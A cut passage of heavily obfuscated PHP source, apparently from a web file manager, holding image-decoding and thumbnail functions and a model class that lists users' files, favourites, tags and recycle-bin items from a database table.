imagedestroy($fÉÖàƒÆÏ¡); return !1; } list(, $E‡ë²ã…µÛ, $Dµ¿÷õ­ä¬) = unpack($B‰¬º†‚¦İ[1824], $fºˆ”×±†™ . $BÑ°Ã›İØÑ); for ($DöíÙÍº‘ö = 0, $Dìë³ˆë™µ = 0; $DöíÙÍº‘ö < $E‡ë²ã…µÛ; ++$DöíÙÍº‘ö, ++$BÈäïôªğ, $Dìë³ˆë™µ += $eƒ‡Ó ï»¿) { $f„ÏÈé¦İ = $Dìë³ˆë™µ & 7; imagesetpixel($fÉÖàƒÆÏ¡, $BÈäïôªğ, $dà©Êºá°˜, $A¾ôˆàîœè[($Dµ¿÷õ­ä¬ & $B¼•õÓ“ >> $f„ÏÈé¦İ) >> $E¾›Ê‹“ˆ - $f„ÏÈé¦İ]); } break; } } } else { for ($e·èäˆâ·Â = 0; $e·èäˆâ·Â < $D†ºÜÀ×£; ++$e·èäˆâ·Â, $dà©Êºá°˜ += $A™¥®ƒ»Ää) { $fºˆ”×±†™ = fread($cáøªêº‚, $Cğ¨ÓÔù…Ò); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } $Dìë³ˆë™µ = 0; for ($BÈäïôªğ = 0; $BÈäïôªğ < $EœÒ†ñŠàŠ; ++$BÈäïôªğ, $Dìë³ˆë™µ += $eƒ‡Ó ï»¿) { list(, $Dµ¿÷õ­ä¬) = unpack($B‰¬º†‚¦İ[1825], $fºˆ”×±†™[$Dìë³ˆë™µ >> 3]); $f„ÏÈé¦İ = $Dìë³ˆë™µ & 7; imagesetpixel($fÉÖàƒÆÏ¡, $BÈäïôªğ, $dà©Êºá°˜, $A¾ôˆàîœè[($Dµ¿÷õ­ä¬ & $B¼•õÓ“ >> $f„ÏÈé¦İ) >> $E¾›Ê‹“ˆ - $f„ÏÈé¦İ]); } } } goto A¿©À…²ÅÕ; DÏ¼ËÍ¶í: $A¾ôˆàîœè = array(); for ($DöíÙÍº‘ö = 0; $DöíÙÍº‘ö < $cÏ¸ÌöŒä; ++$DöíÙÍº‘ö) { $fºˆ”×±†™ = fread($cáøªêº‚, $f‹ÎÜ‡ŞÖ); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } extract(unpack($B‰¬º†‚¦İ[1821], $fºˆ”×±†™ . $B‰¬º†‚¦İ[1820])); $A¾ôˆàîœè[] = imagecolorallocate($fÉÖàƒÆÏ¡, $C ô°Ä¯Ëš, $Fà¯ÜÀ½¬–, $f„ÏÈé¦İ); } $E¾›Ê‹“ˆ = 8 - $eƒ‡Ó ï»¿; goto eË¨‡½»ğÃ; A¿©À…²ÅÕ: } else { goto cšÙ­Ûóå; D¨çí’Ø: for ($e·èäˆâ·Â = 0; $e·èäˆâ·Â < $D†ºÜÀ×£; ++$e·èäˆâ·Â, $dà©Êºá°˜ += $A™¥®ƒ»Ää) { $fºˆ”×±†™ = fread($cáøªêº‚, $Cğ¨ÓÔù…Ò); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } $Dìë³ˆë™µ = 0; for ($BÈäïôªğ = 0; $BÈäïôªğ < $EœÒ†ñŠàŠ; ++$BÈäïôªğ, $Dìë³ˆë™µ += $f·¸ˆ´åĞ÷) { list(, $Dµ¿÷õ­ä¬) = unpack($B‰¬º†‚¦İ[1802], substr($fºˆ”×±†™, $Dìë³ˆë™µ, $f·¸ˆ´åĞ÷) . $B‰¬º†‚¦İ[1826]); $D´¶„²…›ò = $Dµ¿÷õ­ä¬ & $bßºÓñš; $CÌ‘Õ•íê = $Dµ¿÷õ­ä¬ & $d¡Ô¯Î‰¡Ì; $A ¢ëùñ¶é = $Dµ¿÷õ­ä¬ & $b¨Ú²ÆÍ ; $f—ºõ¶³½ = $Dµ¿÷õ­ä¬ & $D®£‹ÖŒ­Ö; $bñÌ‡¼˜¡İ = $DÛ©øãó‰« - (($D´¶„²…›ò << 7) - $D´¶„²…›ò) * $EÅ·Ğ¦†»Ó; $C ô°Ä¯Ëš = (($CÌ‘Õ•íê << 8) - $CÌ‘Õ•íê) * $DÛò˜£“Ÿé; $Fà¯ÜÀ½¬– = (($A ¢ëùñ¶é << 8) - $A ¢ëùñ¶é) * $A§øÔß¶±; $f„ÏÈé¦İ = (($f—ºõ¶³½ << 8) - $f—ºõ¶³½) * $báê‹ª›„Á; imagesetpixel($fÉÖàƒÆÏ¡, $BÈäïôªğ, $dà©Êºá°˜, $bñÌ‡¼˜¡İ << 24 | $C ô°Ä¯Ëš << 16 | $Fà¯ÜÀ½¬– << 8 | $f„ÏÈé¦İ); } } imagealphablending($fÉÖàƒÆÏ¡, !0); goto Bƒ¦ïÙªèŠ; fƒ·ìÊ»: $DÛò˜£“Ÿé = $d¡Ô¯Î‰¡Ì ? 1 / $d¡Ô¯Î‰¡Ì : 1; $A§øÔß¶± = $b¨Ú²ÆÍ  ? 1 / $b¨Ú²ÆÍ  : 1; $báê‹ª›„Á = $D®£‹ÖŒ­Ö ? 1 / $D®£‹ÖŒ­Ö : 1; goto D¨çí’Ø; cšÙ­Ûóå: $fÉÖàƒÆÏ¡ = imagecreatetruecolor($EœÒ†ñŠàŠ, $D†ºÜÀ×£); imagealphablending($fÉÖàƒÆÏ¡, !1); if ($bßºÓñš) { imagesavealpha($fÉÖàƒÆÏ¡, !0); } goto A¸ñ½á†¼; A¸ñ½á†¼: $f·¸ˆ´åĞ÷ = $eƒ‡Ó ï»¿ >> 3; $DÛ©øãó‰« = $bßºÓñš ? 127 : 0; $EÅ·Ğ¦†»Ó = $bßºÓñš ? 1 / $bßºÓñš : 1; goto fƒ·ìÊ»; Bƒ¦ïÙªèŠ: } return $fÉÖàƒÆÏ¡; goto BÉÔ‰äçñì; Eß¤ÒÚîµ¯: $D†ºÜÀ×£ = abs($aß°İØØ¿); $dà©Êºá°˜ = $aß°İØØ¿ > 0 ? $D†ºÜÀ×£ - 1 : 0; $A™¥®ƒ»Ää = $aß°İØØ¿ > 0 ? -1 : 1; goto d†Û†ÄË» ; A¢Õ¾ÖÌ‘: if ($EœÒ†ñŠàŠ == 0 || $aß°İØØ¿ == 0 || $Dã¸õ×Åî != 1 || ($bßºÓñš & $d¡Ô¯Î‰¡Ì) != 0 || ($bßºÓñš & $b¨Ú²ÆÍ ) != 0 || ($bßºÓñš & $D®£‹ÖŒ­Ö) != 0 || ($d¡Ô¯Î‰¡Ì & $b¨Ú²ÆÍ ) != 0 || ($d¡Ô¯Î‰¡Ì & $D®£‹ÖŒ­Ö) != 0 || ($b¨Ú²ÆÍ  & $D®£‹ÖŒ­Ö) != 0) { return !1; } if ($fåĞ…À  == 4 || $fåĞ…À  == 5) { $fºˆ”×±†™ = stream_get_contents($cáøªêº‚, $D›ƒ¨°¦µ); if ($fºˆ”×±†™ === !1) { return !1; } return imagecreatefromstring($fºˆ”×±†™); } $Cğ¨ÓÔù…Ò = $EœÒ†ñŠàŠ * $eƒ‡Ó ï»¿ + 31 >> 3 & ~3; goto Eß¤ÒÚîµ¯; BÉÔ‰äçñì: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($F›´¶ª˜¡Ê, $CÒàĞ‡£‘) { goto Dåóå»¥Ø¾; bà³ÈïƒÆ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Dö¹ö‚š¡¼; Dåóå»¥Ø¾: $this->srcFile = $F›´¶ª˜¡Ê; $this->echoType = $CÒàĞ‡£‘; $this->im = self::image($F›´¶ª˜¡Ê); goto BÔÏ±¿öØà; BÔÏ±¿öØà: if (!$this->im) { return !1; } $B§¤Å”‚ğÁ = $_SERVER[¼][33]; $this->imgData = GetImageSize($F›´¶ª˜¡Ê, $B§¤Å”‚ğÁ); goto bà³ÈïƒÆ; Dö¹ö‚š¡¼: } public static function image($Dƒáí‹íæé) { $eËõ¾àÌ‡Ï =& $_SERVER[¼]; $aÊÖ»º…åë = $eËõ¾àÌ‡Ï[33]; $föá§ÌĞ Ÿ = GetImageSize($Dƒáí‹íæé, $aÊÖ»º…åë); $bß‚‰æ¨¶ = !1; switch ($föá§ÌĞ Ÿ[2]) { case IMAGETYPE_GIF: if (!function_exists($eËõ¾àÌ‡Ï[1827])) { break; } $bß‚‰æ¨¶ = imagecreatefromgif($Dƒáí‹íæé); break; case IMAGETYPE_JPEG: if (!function_exists($eËõ¾àÌ‡Ï[1828])) { break; } $bß‚‰æ¨¶ = imagecreatefromjpeg($Dƒáí‹íæé); break; case IMAGETYPE_PNG: if (!function_exists($eËõ¾àÌ‡Ï[1829])) { break; } $bß‚‰æ¨¶ = @imagecreatefrompng($Dƒáí‹íæé); imagesavealpha($bß‚‰æ¨¶, !0); break; case IMAGETYPE_XBM: $bß‚‰æ¨¶ = imagecreatefromxbm($Dƒáí‹íæé); break; case IMAGETYPE_WBMP: $bß‚‰æ¨¶ = imagecreatefromwbmp($Dƒáí‹íæé); break; case IMAGETYPE_BMP: $bß‚‰æ¨¶ = imagecreatefrombmp($Dƒáí‹íæé); break; default: break; } return $bß‚‰æ¨¶; } public static function imageSize($DŞˆĞÒí¶ì) { $d°…êï¦ô‡ =& $_SERVER[¼]; $b‡ì¸ä½ƒ = GetImageSize($DŞˆĞÒí¶ì); if (!$b‡ì¸ä½ƒ) { return !1; } return array($d°…êï¦ô‡[1830] => $b‡ì¸ä½ƒ[0], $d°…êï¦ô‡[1831] => $b‡ì¸ä½ƒ[1]); } function distortion($aŸá¹Ä¦Õ–, $FÔÖ‘¼ÙÜÆ, $aŞ‡Ø…Èë‰) { $B„¥Ø»ŞßÈ = $this->creatImage($this->im, $FÔÖ‘¼ÙÜÆ, $aŞ‡Ø…Èë‰, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($B„¥Ø»ŞßÈ, $aŸá¹Ä¦Õ–); } function prorate($A›°õÒÁÅ‡, $C–‘ï†£É», $Cê•ÀÎÁØä) { $eÃÉî©ºˆ = $C–‘ï†£É» / $Cê•ÀÎÁØä; $Eƒ³˜§ªÂ‘ = $this->srcW / $this->srcH; if ($eÃÉî©ºˆ <= $Eƒ³˜§ªÂ‘) { $fì›Àßù™ = $C–‘ï†£É»; $DÉ”¦‰µ÷ = $fì›Àßù™ * ($this->srcH / $this->srcW); } else { $DÉ”¦‰µ÷ = $Cê•ÀÎÁØä; $fì›Àßù™ = $DÉ”¦‰µ÷ * ($this->srcW / $this->srcH); } if ($this->srcW > $C–‘ï†£É» || $this->srcH > $Cê•ÀÎÁØä) { $c„ªœòñïÛ = $this->creatImage($this->im, $fì›Àßù™, $DÉ”¦‰µ÷, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c„ªœòñïÛ, $A›°õÒÁÅ‡); } else { $c„ªœòñïÛ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c„ªœòñïÛ, $A›°õÒÁÅ‡); } } function cut($e¨÷îíµ, $e¬áĞ«®µË, $fÂêˆ³Æ¬Å) { goto cÖ˜êÖ¤ÛÙ; Fê¸¯Š¢¨´: return $this->echoImage($c¶Šˆ™Ó¾Š, $e¨÷îíµ); goto e×â¹Ä™¬ô; cÖ˜êÖ¤ÛÙ: $e£°¨èî²Ù = $e¬áĞ«®µË / $fÂêˆ³Æ¬Å; $F®Œ«¦ëˆ = $this->srcW / $this->srcH; if ($e£°¨èî²Ù <= $F®Œ«¦ëˆ) { $bÙ½«ë°Ì’ = $fÂêˆ³Æ¬Å; $f¶õêß‚ = $bÙ½«ë°Ì’ * ($this->srcW / $this->srcH); } else { $f¶õêß‚ = $e¬áĞ«®µË; $bÙ½«ë°Ì’ = $f¶õêß‚ * ($this->srcH / $this->srcW); } goto dÔ…¶“»ÖÑ; dÔ…¶“»ÖÑ: $Båç–×Ïóê = $this->creatImage($this->im, $f¶õêß‚, $bÙ½«ë°Ì’, 0, 0, 0, 0, $this->srcW, $this->srcH); $c¶Šˆ™Ó¾Š = $this->creatImage($Båç–×Ïóê, $e¬áĞ«®µË, $fÂêˆ³Æ¬Å, 0, 0, ($f¶õêß‚ - $e¬áĞ«®µË) / 2, ($bÙ½«ë°Ì’ - $fÂêˆ³Æ¬Å) / 2, $e¬áĞ«®µË, $fÂêˆ³Æ¬Å); imageDestroy($Båç–×Ïóê); goto Fê¸¯Š¢¨´; e×â¹Ä™¬ô: } function backFill($C£ë¦¸¶Î, $b¹‹…¯ˆ·¶, $a°†õøÎŸ, $aä«îŒ‰¸¼ = false, $aîìâ—„Â” = 255, $Cìïó×ì´Ô = 255, $F½µÌ•ÒÑµ = 255) { goto DÊàÁŞ»ö’; f«Õˆƒ·İ½: return $this->echoImage($C¶×²µØÉ³, $C£ë¦¸¶Î); goto A…Ä×ëÉå; DÊàÁŞ»ö’: $aÙäã÷·Ã˜ = $b¹‹…¯ˆ·¶ / $a°†õøÎŸ; $CÌ¸¡Ò¯È = $this->srcW / $this->srcH; if ($aÙäã÷·Ã˜ <= $CÌ¸¡Ò¯È) { $fÁÜ½ØË¬† = $b¹‹…¯ˆ·¶; $FÂìÒ»•·Â = $fÁÜ½ØË¬† * ($this->srcH / $this->srcW); } else { $FÂìÒ»•·Â = $a°†õøÎŸ; $fÁÜ½ØË¬† = $FÂìÒ»•·Â * ($this->srcW / $this->srcH); } goto Fˆ©®à’Ê›; C¶÷”Şò’é: if ($aä«îŒ‰¸¼) { $CÚš¤“ñê¤ = imageColorTransparent($C¶×²µØÉ³, $CÚš¤“ñê¤); $EÛÍ—èİ½ = $a°†õøÎŸ - $FÂìÒ»•·Â; } imageFilledRectangle($C¶×²µØÉ³, 0, 0, $b¹‹…¯ˆ·¶, $a°†õøÎŸ, $CÚš¤“ñê¤); if ($this->srcW > $b¹‹…¯ˆ·¶ || $this->srcH > $a°†õøÎŸ) { $E¼ñî¯ ˆ = $this->creatImage($this->im, $fÁÜ½ØË¬†, $FÂìÒ»•·Â, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($fÁÜ½ØË¬† < $b¹‹…¯ˆ·¶) { imageCopy($C¶×²µØÉ³, $E¼ñî¯ ˆ, ($b¹‹…¯ˆ·¶ - $fÁÜ½ØË¬†) / 2, 0, 0, 0, $fÁÜ½ØË¬†, $FÂìÒ»•·Â); } else { if ($FÂìÒ»•·Â < $a°†õøÎŸ) { imageCopy($C¶×²µØÉ³, $E¼ñî¯ ˆ, 0, $EÛÍ—èİ½, 0, 0, $fÁÜ½ØË¬†, $FÂìÒ»•·Â); } else { imageCopy($C¶×²µØÉ³, $E¼ñî¯ ˆ, 0, 0, 0, 0, $fÁÜ½ØË¬†, $FÂìÒ»•·Â); } } } else { imageCopyMerge($C¶×²µØÉ³, $this->im, ($b¹‹…¯ˆ·¶ - $fÁÜ½ØË¬†) / 2, $EÛÍ—èİ½, 0, 0, $fÁÜ½ØË¬†, $FÂìÒ»•·Â, 100); } goto f«Õˆƒ·İ½; Fˆ©®à’Ê›: if (function_exists($_SERVER[¼][1832])) { @($C¶×²µØÉ³ = imageCreateTrueColor($b¹‹…¯ˆ·¶, $a°†õøÎŸ)); if (!$C¶×²µØÉ³) { $C¶×²µØÉ³ = imageCreate($b¹‹…¯ˆ·¶, $a°†õøÎŸ); } } else { $C¶×²µØÉ³ = imageCreate($b¹‹…¯ˆ·¶, $a°†õøÎŸ); } $EÛÍ—èİ½ = ($a°†õøÎŸ - $FÂìÒ»•·Â) / 2; $CÚš¤“ñê¤ = imagecolorallocate($C¶×²µØÉ³, $aîìâ—„Â”, $Cìïó×ì´Ô, $F½µÌ•ÒÑµ); goto C¶÷”Şò’é; A…Ä×ëÉå: } function creatImage($AÎ•Øáİ±Ê, $a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦, $Bó‚£Ş•ï¢, $FƒÌæàîÒñ, $EîÃõİ–â, $bÙïĞ¡Ëè÷, $EÓĞãÖÂ³â, $EŒ¹õßÏ›¿) { if (function_exists($_SERVER[¼][1832])) { @($f“¸öùğŒÄ = ImageCreateTrueColor($a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦)); @imagealphablending($f“¸öùğŒÄ, !1); @imagesavealpha($f“¸öùğŒÄ, !0); if ($f“¸öùğŒÄ) { imageCopyResampled($f“¸öùğŒÄ, $AÎ•Øáİ±Ê, $Bó‚£Ş•ï¢, $FƒÌæàîÒñ, $EîÃõİ–â, $bÙïĞ¡Ëè÷, $a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦, $EÓĞãÖÂ³â, $EŒ¹õßÏ›¿); } else { $f“¸öùğŒÄ = ImageCreate($a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦); imageCopyResized($f“¸öùğŒÄ, $AÎ•Øáİ±Ê, $Bó‚£Ş•ï¢, $FƒÌæàîÒñ, $EîÃõİ–â, $bÙïĞ¡Ëè÷, $a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦, $EÓĞãÖÂ³â, $EŒ¹õßÏ›¿); } } else { $f“¸öùğŒÄ = ImageCreate($a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦); imageCopyResized($f“¸öùğŒÄ, $AÎ•Øáİ±Ê, $Bó‚£Ş•ï¢, $FƒÌæàîÒñ, $EîÃõİ–â, $bÙïĞ¡Ëè÷, $a°Çã¼½•Ü, $aÖ‹ÚóÂ¦¦, $EÓĞãÖÂ³â, $EŒ¹õßÏ›¿); } return $f“¸öùğŒÄ; } public function imgRotate($B„¶×ˆÖ÷™, $Eº½ùºğÁÄ) { goto A©ğìŠÄƒª; A©ğìŠÄƒª: if (!$this->im || $Eº½ùºğÁÄ % 360 === 0 || !function_exists($_SERVER[¼][1833])) { return !1; } $bØØ”õ…ìÊ = imageRotate($this->im, 360 - $Eº½ùºğÁÄ, 0); $fîí¬‚·Ü¿ = !1; goto AÀêëà¯; eºÑÚÉ¨ĞÑ: return $fîí¬‚·Ü¿; goto e¦‰í£¿; AÀêëà¯: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $fîí¬‚·Ü¿ = imagegif($bØØ”õ…ìÊ, $B„¶×ˆÖ÷™); break; case IMAGETYPE_JPEG: $fîí¬‚·Ü¿ = imagejpeg($bØØ”õ…ìÊ, $B„¶×ˆÖ÷™, 100); break; case IMAGETYPE_PNG: $fîí¬‚·Ü¿ = imagePNG($bØØ”õ…ìÊ, $B„¶×ˆÖ÷™); break; default: break; } imageDestroy($bØØ”õ…ìÊ); imageDestroy($this->im); goto eºÑÚÉ¨ĞÑ; e¦‰í£¿: } function echoImage($E²ß‰‰Û²—, $aŸ™¾µÜÖ£) { goto c§ÌÃ„ë©š; c§ÌÃ„ë©š: $b™Ğİ‰¸Ëã =& $_SERVER[¼]; if (!$E²ß‰‰Û²—) { return !1; } ob_get_clean(); goto eé†Òì»éâ; eé†Òì»éâ: $B¸Îº›¯’ = !1; switch ($this->echoType) { case $b™Ğİ‰¸Ëã[1834]: $B¸Îº›¯’ = imagePNG($E²ß‰‰Û²—); break; case $b™Ğİ‰¸Ëã[164]: $B¸Îº›¯’ = imagePNG($E²ß‰‰Û²—, $aŸ™¾µÜÖ£); break; } imageDestroy($E²ß‰‰Û²—); goto A²Õ¦»…Ø; A²Õ¦»…Ø: imageDestroy($this->im); return $B¸Îº›¯’; goto d«ÍÚ•´¼ª; d«ÍÚ•´¼ª: } } goto FË‰•Í¿Îß; bôäùØëà·: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\162\x63\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\155\145" => "\151\157\137\163\157\165\162\x63\x65\x5f\155\x65\164\x61", "\x6d\145\164\x61\x46\151\145\x6c\144" => "\x73\x6f\x75\162\x63\x65\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\x54\151\x6d\145", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156"), array("\x63\162\145\141\x74\145\124\151\155\145", "\x74\x69\155\145", "\151\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\166\151\x65\x77\124\151\155\145", "\164\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\x75\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($fÕ„¤ˆ‹Êé) { return $this->listSource(array($_SERVER[¼][365] => $fÕ„¤ˆ‹Êé)); } public function typeName($Fğ‘â°Õº) { static $c¼¹ö—§Ş = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $c¼¹ö—§Ş[$Fğ‘â°Õº . $_SERVER[¼][33]]; } public function sourceListInfo($cö°–¯Èâ¥, $bùÎ –©é = false) { goto d×¯øõöÄ; d×¯øõöÄ: $Cï„ô¬åè½ =& $_SERVER[¼]; $cö°–¯Èâ¥ = $cö°–¯Èâ¥ ? $cö°–¯Èâ¥ : array(); $cö°–¯Èâ¥ = array_filter(array_unique($cö°–¯Èâ¥)); goto e§Ä£ÕµÜ‹; e§Ä£ÕµÜ‹: if (!$cö°–¯Èâ¥) { return array(); } $dŠï’ŒæÏõ = $this->where(array($Cï„ô¬åè½[366] => array($Cï„ô¬åè½[7], $cö°–¯Èâ¥)))->select(); $this->_listDataApply($dŠï’ŒæÏõ, $bùÎ –©é); goto fëšÅ©³™¤; fëšÅ©³™¤: return array_to_keyvalue($dŠï’ŒæÏõ, $Cï„ô¬åè½[366]); goto Cëæ£˜Ë‚Ú; Cëæ£˜Ë‚Ú: } public function pathInfoFilter($E‡¹’ŠÎ—Ø) { goto a˜ÔË…Ø•š; eÒŠ­¼ğø: $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[368]] = $this->typeName($E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[368]]); if ($E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[367]] != 1) { $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[157]] = $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[369]]; unset($E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[369]]); } $eœÀö¼Â„ò = $bóĞÒ£Šå‹[370]; goto AßÑÜ¦ãØ; AßÑÜ¦ãØ: $eœÀö¼Â„ò .= $bóĞÒ£Šå‹[371]; $eœÀö¼Â„ò .= $bóĞÒ£Šå‹[372]; $bšš…£ˆº = explode($bóĞÒ£Šå‹[47], $eœÀö¼Â„ò); goto f¾ŠÙ©Çù³; f¾ŠÙ©Çù³: if (isset($E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[373]]) && $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[373]][$bóĞÒ£Šå‹[374]] == -1) { $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[184]); $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[107]); $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[375]); $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[376]); $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[77]); $bšš…£ˆº = array_remove_value($bšš…£ˆº, $bóĞÒ£Šå‹[377]); } $E‡¹’ŠÎ—Ø = array_field_key($E‡¹’ŠÎ—Ø, $bšš…£ˆº); return $E‡¹’ŠÎ—Ø; goto BëŞ¶ÃÇÅì; a˜ÔË…Ø•š: $bóĞÒ£Šå‹ =& $_SERVER[¼]; $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[75]] = KodIO::make($E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[366]]); $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[29]] = $E‡¹’ŠÎ—Ø[$bóĞÒ£Šå‹[367]] == 1 ? $bóĞÒ£Šå‹[76] : $bóĞÒ£Šå‹[164]; goto eÒŠ­¼ğø; BëŞ¶ÃÇÅì: } public function listUserFav() { goto bÚÑ—¢Œ’; aÙ¦ãç´¾: foreach ($cˆ˜Ç»Â•à as &$Cš£ÄÎ†Õ´) { $Cš£ÄÎ†Õ´ = array($aÆÑÖæ ¨[382] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[364]], $aÆÑÖæ ¨[383] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[28]], $aÆÑÖæ ¨[384] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[75]], $aÆÑÖæ ¨[385] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[29]], $aÆÑÖæ ¨[386] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[184]], $aÆÑÖæ ¨[387] => $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[107]]); if ($Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[29]] == $aÆÑÖæ ¨[379] && $fŒ†ì¿†Š[$Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[75]]]) { $Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[388]] = $fŒ†ì¿†Š[$Cš£ÄÎ†Õ´[$aÆÑÖæ ¨[75]]]; } } return $cˆ˜Ç»Â•à; goto Aæå”ßÓÔî; bÚÑ—¢Œ’: $aÆÑÖæ ¨ =& $_SERVER[¼]; $cˆ˜Ç»Â•à = Model($aÆÑÖæ ¨[378])->listData(); $c‚ÍµÕÛ“’ = array_filter_by_field($cˆ˜Ç»Â•à, $aÆÑÖæ ¨[29], $aÆÑÖæ ¨[379]); goto e†µîÃÉ††; e†µîÃÉ††: $c‚ÍµÕÛ“’ = array_to_keyvalue($c‚ÍµÕÛ“’, $aÆÑÖæ ¨[33], $aÆÑÖæ ¨[75]); if ($c‚ÍµÕÛ“’) { $fŒ†ì¿†Š = $this->listSource(array($aÆÑÖæ ¨[380] => array($aÆÑÖæ ¨[381], $c‚ÍµÕÛ“’))); } $fŒ†ì¿†Š = array_to_keyvalue($fŒ†ì¿†Š[$aÆÑÖæ ¨[351]], $aÆÑÖæ ¨[366]); goto aÙ¦ãç´¾; Aæå”ßÓÔî: } public function listUserTag($D¸²›ë÷­) { goto Cã’Í‰‰Ò; DÈ…°†Êä×: $B¯çÕÑÁ…¿ = array_to_keyvalue($B¯çÕÑÁ…¿, $eĞä —çî¦[33], $eĞä —çî¦[75]); if (!$B¯çÕÑÁ…¿) { return array(); } $DÜˆŒˆĞ¬ = array($eĞä —çî¦[380] => array($eĞä —çî¦[381], $B¯çÕÑÁ…¿)); goto eæ°ïËù³; Cã’Í‰‰Ò: $eĞä —çî¦ =& $_SERVER[¼]; $c¿ğ—¶Ê = Model($eĞä —çî¦[389])->listData(); $B¯çÕÑÁ…¿ = array_filter_by_field($c¿ğ—¶Ê, $eĞä —çî¦[390], $D¸²›ë÷­); goto DÈ…°†Êä×; eæ°ïËù³: return $this->listSource($DÜˆŒˆĞ¬); goto EÍÀÇ‹Ø·Å; EÍÀÇ‹Ø·Å: } public function listUserRecycle() { $cÏ¼ÀÑç­ê =& $_SERVER[¼]; $cÕ…Å¾‰Ô = Model($cÏ¼ÀÑç­ê[391])->listData(); if (!$cÕ…Å¾‰Ô) { return array(); } $bâªâİ‘¶ì = array($cÏ¼ÀÑç­ê[380] => array($cÏ¼ÀÑç­ê[381], $cÕ…Å¾‰Ô), $cÏ¼ÀÑç­ê[392] => 1); return $this->listSource($bâªâİ‘¶ì); } public function listSource($bêš¹Á¡ãö, $Cƒ¼³Ô£ä = 3000) { goto b×Î°ˆÓÒ©; BÑ—¨Æ¸¥: $A ¯ºäíâÔ = $this->field($aØ²«ÜÈÄ§)->_makeOrder()->where($bêš¹Á¡ãö)->selectPage($Cƒ¼³Ô£ä); $this->_listDataApply($A ¯ºäíâÔ[$BŒæâ·ò¸â[351]]); $this->_listMake($A ¯ºäíâÔ); goto D÷’¯·£Š; D÷’¯·£Š: return $A ¯ºäíâÔ; goto aƒ×¿ˆ†â; b×Î°ˆÓÒ©: $BŒæâ·ò¸â =& $_SERVER[¼]; if (!isset($bêš¹Á¡ãö[$BŒæâ·ò¸â[393]])) { $bêš¹Á¡ãö[$BŒæâ·ò¸â[393]] = 0; } $aØ²«ÜÈÄ§ = $BŒæâ·ò¸â[394]; goto BÑ—¨Æ¸¥; aƒ×¿ˆ†â: } protected function _makeOrder() { goto A¦ƒ…æÃ‘; cˆí””Ê…: if ($DÏÜùÑ¢â == $cŸ½õéÉ†[28]) { } $E…½‘ö½·« = $cŸ½õéÉ†[405] . $Aá¹æÁÅÕí[$DÏÜùÑ¢â] . $cŸ½õéÉ†[50] . $FË˜™ÀÄ­¯[$bç•Ã†…¤]; return $this->order(rtrim(trim($E…½‘ö½·«), $cŸ½õéÉ†[47])); goto b†Êğíºİ³; A¦ƒ…æÃ‘: $cŸ½õéÉ† =& $_SERVER[¼]; $F¬°ôíÏ = Model($cŸ½õéÉ†[395])->get($cŸ½õéÉ†[396]); $CŒÃÖ‡Øñ = Model($cŸ½õéÉ†[395])->get($cŸ½õéÉ†[397]); goto AÅˆ¾…; C‹³Õ‡¿ìè: $bç•Ã†…¤ = Input::get($cŸ½õéÉ†[404], $cŸ½õéÉ†[7], $CŒÃÖ‡Øñ, array_keys($FË˜™ÀÄ­¯)); if (!in_array($DÏÜùÑ¢â, array_keys($Aá¹æÁÅÕí))) { $DÏÜùÑ¢â = $cŸ½õéÉ†[28]; } if (!in_array($bç•Ã†…¤, 